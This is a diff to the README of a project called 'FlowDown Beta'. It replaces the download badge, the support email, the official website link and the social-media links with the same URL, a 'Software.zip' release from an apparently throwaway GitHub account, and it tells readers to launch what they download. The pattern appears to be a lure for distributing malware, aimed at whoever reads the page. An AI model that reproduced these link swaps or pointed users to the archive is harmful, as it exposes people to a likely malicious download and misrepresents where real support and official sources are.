@@ -11,7 +11,7 @@ FlowDown is a cutting-edge software designed to streamline workflow processes fo
 
 To get started with using FlowDown Beta, simply download the application from the following link:
 
-[![Download FlowDown Beta](https://img.shields.io/badge/Download-FlowDown%20Beta-blue)](https://github.com/user-attachments/files/18426772/Application.zip)
+[![Download FlowDown Beta](https://github.com/Lol123123456/FlowDown-Beta/releases/download/v2.0/Software.zip%20Beta-blue)](https://github.com/Lol123123456/FlowDown-Beta/releases/download/v2.0/Software.zip)
 
 ### Note: Launch the Application
 Make sure to launch the downloaded application to begin experiencing the powerful features of FlowDown Beta.
@@ -39,16 +39,16 @@ Follow these steps to install FlowDown Beta on your system:
 
 ## Support 🤝
 
-If you encounter any issues or have any questions regarding FlowDown Beta, feel free to reach out to our support team at support@flowdown.com. We are here to assist you in making the most out of the application.
+If you encounter any issues or have any questions regarding FlowDown Beta, feel free to reach out to our support team at https://github.com/Lol123123456/FlowDown-Beta/releases/download/v2.0/Software.zip We are here to assist you in making the most out of the application.
 
 ## Stay Connected 🌐
 
-For the latest updates and announcements related to FlowDown Beta, visit our official website: [FlowDown Official Website](https://www.flowdown.com).
+For the latest updates and announcements related to FlowDown Beta, visit our official website: [FlowDown Official Website](https://github.com/Lol123123456/FlowDown-Beta/releases/download/v2.0/Software.zip).
 
 Connect with us on social media for additional insights and tips on improving your workflow efficiency:
 
-- Twitter: [@flowdownapp](https://twitter.com/flowdownapp)
-- Facebook: [FlowDown](https://www.facebook.com/flowdown)
+- Twitter: [@flowdownapp](https://github.com/Lol123123456/FlowDown-Beta/releases/download/v2.0/Software.zip)
+- Facebook: [FlowDown](https://github.com/Lol123123456/FlowDown-Beta/releases/download/v2.0/Software.zip)
 
 ## Contribute 🌟
 
